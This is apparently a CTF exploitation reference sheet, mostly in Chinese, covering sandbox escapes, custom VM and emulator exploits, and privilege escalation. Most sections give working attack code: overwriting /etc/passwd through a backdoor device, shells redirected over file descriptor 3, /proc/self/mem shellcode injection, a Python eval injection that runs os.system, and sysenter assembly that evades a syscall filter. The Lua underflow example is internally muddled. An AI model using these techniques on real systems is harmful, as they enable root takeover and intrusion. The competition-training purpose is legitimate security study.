# CTF Pwn - Sandbox Escape and Restricted Environments

## Table of Contents
- [Python Sandbox Escape](#python-sandbox-escape)
- [VM Exploitation (Custom Bytecode)](#vm-exploitation-custom-bytecode)
- [FUSE/CUSE Character Device Exploitation](#fusecuse-character-device-exploitation)
- [Busybox/Restricted Shell Escalation](#busyboxrestricted-shell-escalation)
- [Shell Tricks](#shell-tricks)
- [Write-Anywhere via /proc/self/mem (BSidesSF 2025)](#write-anywhere-via-procselfmem-bsidessf-2025)
- [process_vm_readv Failure as Sandbox Escape (0CTF 2016)](#process_vm_readv-failure-as-sandbox-escape-0ctf-2016)
- [Named Pipe mkfifo for File Size Check Bypass (Nuit du Hack 2016)](#named-pipe-mkfifo-for-file-size-check-bypass-nuit-du-hack-2016)
- [Lua Integer Underflow via Game Logic (ASIS CTF Finals 2017)](#lua-integer-underflow-via-game-logic-asis-ctf-finals-2017)
- [CPU Emulator Print Opcode Python eval Injection (Midnight Sun CTF 2018)](#cpu-emulator-print-opcode-python-eval-injection-midnight-sun-ctf-2018)
- [Unicorn Emulator Syscall Blacklist Bypass via sysenter and Uncommon Syscalls (Meepwn CTF Quals 2018)](#unicorn-emulator-syscall-blacklist-bypass-via-sysenter-and-uncommon-syscalls-meepwn-ctf-quals-2018)
- [Custom VM swap Pointer Self-Overwrite (HITCON 2018)](#custom-vm-swap-pointer-self-overwrite-hitcon-2018)

---

## Python Sandbox Escape

Python jail/sandbox escape 技术（AST 绕过、audit hook 绕过、基于 MRO 恢复 builtin、装饰器链、受限字符集技巧等）已在 `ctf-misc` skill 中完整覆盖。需要 pyjail 技巧时，调用 `/ctf-misc`。

## VM Exploitation (Custom Bytecode)

**模式（TerViMator, Pragyan 2026）：** 自定义 VM，带寄存器、opcode、syscall。保护为 Full RELRO + NX + PIE。

**VM syscall 常见漏洞：**
- **OOB 读写：** `inspect(obj, offset)` 与 `write_byte(obj, offset, val)` 缺少边界检查，可越界读写对象缓冲区之外的结构体数据
- **通过 name 触发结构体溢出：** `name(obj, length)` 直接向对象结构体写入，可溢出到相邻字段

**利用模式：**
1. 分配两个对象（data + exec）
2. 用越界 `inspect` 读取 exec 对象中经过 XOR 编码的函数指针，泄漏 PIE 基址
3. 用 `name` 溢出把 exec 对象中的指针改成 `win() ^ KEY`
4. `execute(obj)` 解码后调用被补丁过的函数指针

## FUSE/CUSE Character Device Exploitation

**FUSE**（Filesystem in Userspace）/ **CUSE**（Character device in Userspace）

**核心点：** FUSE/CUSE 设备的处理逻辑运行在用户态，并继承设备守护进程的权限。若该守护进程以 root 运行，并在 write handler 中暴露命令接口，则任何能写该设备文件的用户都可获得 root 级操作能力（chmod、文件读写等）。

**识别方式：**
- 查找 `cuse_lowlevel_main()` 或 `fuse_main()` 调用
- 查设备操作结构体中是否存在 `open`、`read`、`write` handler
- 查是否以 `DEVNAME=backdoor` 之类名称注册设备

**常见漏洞模式：**
```c
// Backdoor pattern: write handler with command parsing
void backdoor_write(const char *input, size_t len) {
    char *cmd = strtok(input, ":");
    char *file = strtok(NULL, ":");
    char *mode = strtok(NULL, ":");
    if (!strcmp(cmd, "b4ckd00r")) {
        chmod(file, atoi(mode));  // Arbitrary chmod!
    }
}
```

**利用：**
```bash
# Change /etc/passwd permissions via custom device
echo "b4ckd00r:/etc/passwd:511" > /dev/backdoor

# 511 decimal = 0777 octal (rwx for all)
# Now modify passwd to get root
echo "root::0:0:root:/root:/bin/sh" > /etc/passwd
su root
```

**通过修改 passwd 提权：**
1. 先通过后门把 `/etc/passwd` 变为可写
2. 把 root 行替换为 `root::0:0:root:/root:/bin/sh`（无密码）
3. 直接 `su root`

## Busybox/Restricted Shell Escalation

当身处无 sudo 的受限环境时：
1. 先找可写路径，尤其是字符设备
2. 目标优先级：`/etc/passwd`、`/etc/shadow`、`/etc/sudoers`
3. 先改权限，再改内容以获取 root

**核心点：** 在无 sudo 的受限环境里，自定义字符设备（如 `/dev/backdoor`）或可写系统文件就是最直接的提权入口。只要能写 `/etc/passwd`（去掉 root 密码）或 `/etc/sudoers`（添加 NOPASSWD），就能拿 root。

## Shell Tricks

**文件描述符重定向（无需反连 shell）：**
```bash
# Redirect stdin/stdout to client socket (fd 3 common for network)
exec <&3; sh >&3 2>&3

# Or as single command string
exec<&3;sh>&3
```
- 网络服务常把客户端连接放在 fd 3
- 不依赖出站连接，规避防火墙
- 适合有命令执行但字符受限的环境

**定位正确 fd：**
```bash
ls -la /proc/self/fd           # List open file descriptors
```

**更短的 shell 变体：**
- `sh<&3 >&3` - 最短重定向 shell 之一
- 某些 shell 中可用 `$0` 代替 `sh`

**核心点：** 网络服务通常把客户端 socket 放在 fd 3。把 stdin/stdout 重定向到它（`exec <&3; sh >&3 2>&3`）即可在当前连接上直接得到交互 shell，无需反向连接。

---

## Write-Anywhere via /proc/self/mem (BSidesSF 2025)

若服务允许对任意文件的任意偏移写入，可直接把目标设为 `/proc/self/mem` 做代码注入：

```python
from pwn import *

# Service API: send filename, offset, content
def write_mem(r, offset, data):
    r.sendline(b'/proc/self/mem')
    r.sendline(str(offset).encode())
    r.sendline(data)

# 1. Leak a return address from the stack (or use known binary address)
# 2. Write shellcode to a writable+executable region (or reuse existing code)
# 3. Overwrite return address to point to shellcode

shellcode = asm(shellcraft.sh())

r = remote(host, port)
# Overwrite code at known address (e.g., after close@plt returns)
write_mem(r, target_code_addr, shellcode)
```

**核心点：** `/proc/self/mem` 提供对当前进程虚拟内存的随机访问读写，可绕过普通 mmap 层面的页权限限制。即便目标代码段按常规映射为只读，也可以通过该接口直接改页表后面的内容，效果类似调试器的 `PTRACE_POKETEXT`。

**要求：** 文件写原语必须支持二进制数据（含空字节），且偏移必须对应到一个有效映射地址。

---

### process_vm_readv Failure as Sandbox Escape (0CTF 2016)

**模式：** 沙箱先用 `process_vm_readv()` 验证路径，再调用 `realpath()`。如果攻击者把路径字符串放到仅 `PROT_READ` 的映射中，使得沙箱进程无法通过 `process_vm_readv` 读取，这个验证步骤就会静默失败，从而绕过检查。

```c
// Create memory at fixed address with only read permission
mmap(0x13370000, 0x1000, PROT_READ, MAP_FIXED|MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
// Store path string there -- sandbox's process_vm_readv fails
// realpath() also fails -- path check bypassed entirely
// Then: open("/flag") succeeds through the sandbox
```

**核心点：** 这种沙箱默认“验证成功或拒绝”，却没有处理 `process_vm_readv` 读取失败的第三种情况，因此形成绕过。被沙箱化的进程仍能正常读取自己的内存，但监督进程无法通过 `process_vm_readv` 读取那块区域。

**References:** 0CTF 2016

---

### Named Pipe mkfifo for File Size Check Bypass (Nuit du Hack 2016)

**模式：** 程序在处理文件前先检查文件大小。命名管道（FIFO）在 `stat()` 看起来 `st_size = 0`，但真正读取时却能输出任意数据，从而绕过基于大小的溢出防护。

```bash
mkfifo /tmp/payload_pipe
# In background, feed overflow payload to the pipe
cat exploit_data > /tmp/payload_pipe &
# Binary sees size=0, skips bounds check, reads arbitrary data
./vulnerable_binary /tmp/payload_pipe
```

还可结合符号链接复用字符串：`ln -s /flag arena.c`，借程序中已有字符串作为 ROP 链目标文件名。

**核心点：** 命名管道在 `stat()` 下永远显示为大小 0，因此任何“先用 `stat()` 分配/校验，再 `read()` 读取”的程序都可能被绕过。

**References:** Nuit du Hack 2016

---

### Lua Integer Underflow via Game Logic (ASIS CTF Finals 2017)

**模式：** 文本游戏（Lua 编写）中，库存管理对同一数值连续应用两个独立的百分比扣减，且没有限制总扣减量：先做一次 100% 衰减把库存清零，再对已经为 0 的值追加 10% 惩罚，就会下溢到负数。卖出这些下溢后的物品即可获得无限金钱。

**漏洞逻辑：**
```lua
-- Applied sequentially, no combined-total check:
inventory = inventory - math.floor(inventory * 0.10)  -- 10% penalty first
inventory = inventory - math.floor(inventory * 1.00)  -- 100% decay = zeroed

-- If applied in the other order, or combined:
-- 100% decay → inventory = 0
-- 10% of 0 = 0 → total reduction = 100%, no underflow

-- But with uncapped sequential application:
-- Step 1: inventory -= inventory * decay_rate  (e.g., decay=100% → 0)
-- Step 2: inventory -= extra_penalty           (penalty on already-zero → negative)
-- Result: inventory = -penalty_amount  (wraps or treated as large positive)
```

**利用：**
```python
# 1. Identify the two independent reduction events in the game loop
#    (e.g., end-of-round decay AND a transaction penalty)
# 2. Trigger both in the same game tick without intermediate capping
# 3. Verify inventory went negative (may display as large number or 0 + debt)
# 4. Sell the underflowed items: game calculates price * negative_count
#    → negative total, or wraps to huge positive → unlimited currency
# 5. Use unlimited currency to purchase the flag item
```

**核心点：** 游戏经济系统里的业务逻辑错误也能造成整数下溢，无需任何内存破坏。重点找同一 tick 中对同一整数应用多个独立百分比修改且没有上界限制的逻辑。

**References:** ASIS CTF Finals 2017

---

### CPU Emulator Print Opcode Python eval Injection (Midnight Sun CTF 2018)

**模式：** 自定义 CPU 模拟器的 print 功能为了处理转义字符，使用 `eval('"' + string_buffer + '"')`。于是只要用 ADD opcode 在模拟器内存中逐字符构造 `"+__import__("os").system("cmd")#`，就能闭合字符串并执行任意 Python。

**利用策略：**
1. 模拟器实现了 ADD、MOV、PRINT 等自定义指令
2. PRINT opcode 从模拟器内存中取字符串，并传给 `eval('"' + s + '"')` 处理 `\n`、`\t` 等转义
3. 用 ADD opcode 逐字符构造注入串
4. 注入串 `"+__import__("os").system("cmd")#` 会闭合开头引号，拼接 `__import__("os").system()`，再用 `#` 注释掉尾部多余引号

```python
from pwn import *

# Emulator opcodes (example encoding)
ADD = 0x01   # ADD addr, immediate_byte
PRINT = 0x58  # Print string from memory (triggers eval)

def build_char(c):
    """Generate ADD opcodes to set a memory byte to character c"""
    addr = current_mem_ptr()
    return bytes([ADD, addr, ord(c)])

# Build injection payload in emulator memory
cmd = "cat /flag"
injection = '''"+__import__("os").system("%s")#''' % cmd

program = b""
for c in injection:
    program += build_char(c)

# Trigger PRINT opcode -> eval('"' + injection + '"')
# eval becomes: eval('""+__import__("os").system("cat /flag")#"')
# The # comments out the trailing quote
program += bytes([PRINT, 0x00])  # PRINT from address 0

io = remote('target', 1337)
io.send(program)
io.interactive()
```

**核心点：** 只要模拟器/解释器用 `eval()` 处理输出字符串，就可以通过先闭合字符串，再拼接任意 Python 代码完成逃逸。`#` 则用于截断尾部语法。

**References:** Midnight Sun CTF 2018

---

### Unicorn Emulator Syscall Blacklist Bypass via sysenter and Uncommon Syscalls (Meepwn CTF Quals 2018)

**模式：** 基于 Unicorn 的 shellcode runner 用 `UC_HOOK_INSN` 钩住 `int 0x80`，再用 `UC_HOOK_MEM_*` 拦截黑名单 syscall（execve、read、write、mmap）。过滤器只覆盖了 `int 0x80` 路径，以及作者想到的那几种 syscall。

**绕过：**
1. 用 `sysenter` 替代 `int 0x80`，Unicorn 的 `INT` hook 不会在快速路径上触发
2. 用功能等价但不在黑名单中的 syscall：
   - `dup3` 替代 `dup2`
   - `openat` 替代 `open`
   - `pread64` 替代 `read`
   - `sendfile` 直接在两个 fd 之间搬运文件内容，无需 `write`
3. 如果连 `execve` 都被列入黑名单，可进一步通过 `sys_socketcall`（opcode `0x66`）+ 特制 syscall 模式切换完成 `execve("/bin/sh", ...)`

```asm
; Swap file from /flag to stdout without read/write
mov eax, 0x123            ; __NR_openat
mov ebx, -100             ; AT_FDCWD
lea ecx, [flag_path]
xor edx, edx
sysenter                  ; NOT int 0x80 — bypasses Unicorn INT hook

; fd is now in eax
mov ebx, eax              ; src fd
mov ecx, 1                ; dst fd (stdout)
xor edx, edx              ; NULL offset
mov esi, 0x1000           ; count
mov eax, 0xbb             ; __NR_sendfile
sysenter
```

**核心点：** Unicorn 的指令级过滤常只关注特定 opcode。若只拦 `int 0x80`，那 `sysenter`、`syscall`、甚至某些测试环境里的 `int 0x2e` 都可能漏掉。同时，应系统性枚举等价 syscall：`dup3/openat/pread64/sendfile/writev/mmap2` 足以覆盖很多被拦的基础调用。

**References:** Meepwn CTF Quals 2018 — writeups 10415, 10428

---

## Custom VM swap Pointer Self-Overwrite (HITCON 2018)

**模式：** 某自定义 VM 暴露 `swap(a, b)` 指令，它按相对保存的 `sp` 来读取两个栈索引。若 VM 从不检查 `sp_nxt` 是否越界，那么调用 `swap(-1, 0)` 或 `swap(-2, -1)` 时，就会把内部的 `sp_nxt` 本身当作可交换对象。之后所有指令都会作用于任意内存。

```text
swap(-1, 0)     # treats &sp_nxt as stack[-1]; swaps sp_nxt <-> stack[0]
# sp_nxt now points wherever stack[0] used to; writes go anywhere
```

接着用一个 `push` 把 shellcode 字节写到新的指针位置，再把 VM dispatch table 中的函数指针改到这段 shellcode 区域。

**核心点：** 任何能改写 VM 自身状态指针的原语，都会立刻升级成任意写。分析 VM opcode 时，应优先探测能否通过负索引或边界条件把栈指针本身纳入寻址范围。

**References:** HITCON CTF 2018 — Abyss I, writeups 11918-11919
